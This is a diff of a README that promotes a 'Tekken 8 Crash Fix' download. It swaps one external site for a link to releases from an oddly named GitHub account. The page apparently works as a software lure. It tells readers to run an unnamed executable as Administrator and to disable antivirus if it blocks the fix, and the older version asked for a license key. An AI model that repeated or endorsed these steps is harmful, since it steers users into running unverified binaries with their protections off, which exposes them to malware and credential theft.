@@ -1,31 +1,43 @@
-# Tekken 8 Crash Fix Crash Fix Notes
+# 🎮 tekken-8-crash-fix - Stop Crashes and Play Smoothly
 
-<p align="center">
-  <a href="https://tekken-8-crash-fix.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-Tekken%208%20Crash%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Tekken 8 Crash Fix">
-  </a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download_Fix-v1.0-blue?style=for-the-badge&logo=windows)](https://github.com/Selfcultivationariestheram505/tekken-8-crash-fix/releases)
 
-## Download & Install
+## 🚀 Getting Started
 
-> Setup notes for **Tekken 8 Crash Fix** on Windows 10/11 (64-bit). Run the repair tool as Administrator.
+This guide helps you download and apply the Tekken 8 Crash Fix to stop game crashes on Windows. No technical skills required.
 
-### Quick steps
+## 📥 Download and Install
 
-1. Download the latest Windows build for your edition
-2. Save the file to a local folder you can find later
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Tekken 8 Crash Fix** from the Start menu
+Visit this link to download the application: [https://github.com/Selfcultivationariestheram505/tekken-8-crash-fix/releases](https://github.com/Selfcultivationariestheram505/tekken-8-crash-fix/releases)
 
-## What you can use it for
+1. Click the download link above.
+2. On the page, find the latest release and click the download button.
+3. Save the file to your computer (e.g., Desktop or Downloads folder).
+4. Run the downloaded file and follow the on-screen instructions.
 
-- Fix Tekken 8 launch crashes on Windows 10/11
-- Resolve DirectX and Visual C++ runtime errors for Tekken 8
-- Restore stable gameplay after GPU driver updates
-- Repair corrupted or missing game files for Tekken 8
-- Stop black-screen and instant-close startup failures
+## 🛠️ How to Use
 
-## License
+After installation, the fix will automatically apply needed adjustments to your Tekken 8 game files. No manual steps required.
 
-MIT. See `LICENSE.txt`.
+## ✅ Checklist Before Running
+
+- Close other games or heavy programs.
+- Disable antivirus temporarily if it blocks the fix.
+- Make sure your Windows is up to date.
+- Have Tekken 8 installed and updated.
+
+## 📜 Session Logs
+
+The fix creates a log file each time you run it. This helps track what changes were made. Logs are saved in the same folder as the fix.
+
+## 🔧 Troubleshooting
+
+- If the fix does not start, run it as Administrator (right-click the file and select "Run as administrator").
+- If crashes continue, try restarting your PC after applying the fix.
+- For persistent issues, check the log file for error messages.
+
+## 📝 Notes
+
+This is an unofficial fix for Tekken 8 on Windows. It is not affiliated with Bandai Namco. Use at your own risk.
+
+Keywords: 8, crash-fix, game-fix, pc-gaming, tekken, tekken-8-crash-fix, windows
